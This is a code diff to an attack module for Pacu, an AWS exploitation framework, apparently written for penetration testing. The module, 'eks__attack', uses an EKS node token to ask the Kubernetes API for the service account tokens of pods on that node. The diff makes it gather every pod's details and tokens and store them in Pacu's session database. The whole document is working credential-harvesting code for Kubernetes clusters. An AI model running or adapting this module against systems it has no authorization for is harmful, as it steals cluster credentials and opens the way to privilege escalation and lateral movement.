@@ -2,6 +2,7 @@
 import argparse
 import json
 import requests
+from copy import deepcopy
 from botocore.exceptions import ClientError
 # Used to generate eks authentication token
 from awscli.customizations.eks.get_token import STSClientFactory, TokenGenerator
@@ -11,11 +12,6 @@ from awscli.customizations.eks.get_token import STSClientFactory, TokenGenerator
 # look for cluster stored in database
 # store data in database
 # error handling
-
-
-# When writing a module, feel free to remove any comments, placeholders, or
-# anything else that doesn't relate to your module.
-
 module_info = {
     'name': 'eks__attack',
     'author': 'Roshan Guragain',
@@ -123,31 +119,33 @@ class Communicator:
         response_json = response.json()
         token = response_json['status']['token']
         pod.service_account_token = token
-        print(f"Token created for SA {pod.service_account_name} \n {token}\n\n\n")
+        print(f"Token created for SA {pod.service_account_name}")
         return token
 
-    def get_all_tokens(self):
+    def get_all_pods_with_token(self):
         '''
             Get service account token of pods in the node
         '''
+        all_pod_info = {}
         for pod in self.pods:
             try:
                 self.get_sa_token(pod)
+                all_pod_info[pod.name] = pod.__dict__
             except Exception as e:
                 print(f"Pod {pod.name} not in current node. Error: {str(e)}")
-                
+        return all_pod_info
+
 
 # Main is the first function that is called when this module is executed.
 def main(args, pacu_main):
     # session = pacu_main.get_active_session()
-
     args = parser.parse_args(args)
     # print = pacu_main.print
     # input = pacu_main.input
     # key_info = pacu_main.key_info
     # fetch_data = pacu_main.fetch_data
     get_regions = pacu_main.get_regions
-
+    session = pacu_main.get_active_session()
     cluster_name = args.cluster_name
     # cluster_name = 'demo-eks'
 
@@ -174,11 +172,14 @@ def main(args, pacu_main):
             print(cluster_endpoint)
 
             a = Communicator(cluster_endpoint, eks_token)
-            a.get_all_tokens()
+            all_pods = a.get_all_pods_with_token()
 
-            data = {"Eks-Token": eks_token, "endpoint": cluster_endpoint}
-            return data
-        
+            # update EKS data
+            data = {"Cluster": cluster_name, "endpoint": cluster_endpoint, "Pods": all_pods}
+            eks_data = deepcopy(session.EKS)
+            eks_data['eks-attack'] = data
+            session.update(pacu_main.database, EKS=eks_data)
+            return eks_data              
         except ClientError as error:
             print(f"Error: {error}")
 
@@ -193,16 +194,6 @@ def get_eks_node_token(session, cluster_name, region=None):
     return token
 
 
-# The summary function will be called by Pacu after running main, and will be
-# passed the data returned from main. It should return a single string
-# containing a curated summary of every significant thing that the module did,
-# whether successful or not; or None if the module exited early and made no
-# changes that warrant a summary being displayed. The data parameter can
-# contain whatever data is needed in any structure desired. A length limit ofa
-# 1000 characters is enforced on strings returned by module summary functions.
 def summary(data, pacu_main):
-    if 'Eks-Token' in data.keys():
-        return f"EKS node token found.Eks Endpoint {data['endpoint']}"
-    else:
-        return "EKS node token not found"
+    return "Run \"data eks\" to view the data"
 
